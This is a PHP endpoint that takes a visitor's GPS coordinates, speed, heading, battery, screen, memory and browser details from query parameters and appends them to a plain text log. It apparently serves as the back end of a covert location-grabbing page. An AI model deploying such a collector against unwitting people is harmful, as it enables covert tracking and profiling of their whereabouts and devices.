<?php

declare(strict_types=1);

header(
    'Content-Type: application/json; charset=utf-8'
);


function cleanValue(
    mixed $value
): string {

    if ($value === null) {
        return '';
    }

    return trim(
        (string) $value
    );
}


if (
    $_SERVER['REQUEST_METHOD'] !== 'GET'
) {

    http_response_code(405);

    echo json_encode([
        'success' => false,
        'error' =>
            'Method not allowed'
    ]);

    exit;
}


$requestId =
    cleanValue(
        $_GET['request_id'] ?? ''
    );


if (
    !preg_match(
        '/^[a-f0-9-]{20,80}$/i',
        $requestId
    )
) {

    http_response_code(400);

    echo json_encode([
        'success' => false,
        'error' =>
            'Invalid request_id'
    ]);

    exit;
}


$data = [

    'Request ID' =>
        $requestId,

    'Latitude' =>
        cleanValue(
            $_GET['latitude'] ?? ''
        ),

    'Longitude' =>
        cleanValue(
            $_GET['longitude'] ?? ''
        ),

    'User-Agent' =>
        cleanValue(
            $_GET['useragent'] ?? ''
        ),

    'Altitude' =>
        cleanValue(
            $_GET['altitude'] ?? ''
        ),

    'Accuracy' =>
        cleanValue(
            $_GET['accuracy'] ?? ''
        ),

    'Speed' =>
        cleanValue(
            $_GET['speed'] ?? ''
        ),

    'Heading' =>
        cleanValue(
            $_GET['heading'] ?? ''
        ),

    'Platform' =>
        cleanValue(
            $_GET['platform'] ?? ''
        ),

    'Cores' =>
        cleanValue(
            $_GET['hardware'] ?? ''
        ),

    'Memory' =>
        cleanValue(
            $_GET['memory'] ?? ''
        ),

    'Screen Height' =>
        cleanValue(
            $_GET['height'] ?? ''
        ),

    'Screen Width' =>
        cleanValue(
            $_GET['width'] ?? ''
        ),

    'Battery' =>
        cleanValue(
            $_GET['battery'] ?? ''
        )
];


$logFile =
    __DIR__ .
    DIRECTORY_SEPARATOR .
    'geolocate.txt';


$record =
    "========================================" .
    PHP_EOL .
    "Time: " .
    date('Y-m-d H:i:s') .
    PHP_EOL;


foreach (
    $data as $key => $value
) {

    $record .=
        $key .
        ': ' .
        $value .
        PHP_EOL;
}


$record .= PHP_EOL;


if (
    file_put_contents(
        $logFile,
        $record,
        FILE_APPEND | LOCK_EX
    ) === false
) {

    http_response_code(500);

    echo json_encode([
        'success' => false,
        'error' =>
            'Gagal menyimpan geolocation.'
    ]);

    exit;
}


echo json_encode([
    'success' => true,
    'message' =>
        'Location berhasil disimpan.',
    'request_id' =>
        $requestId
]);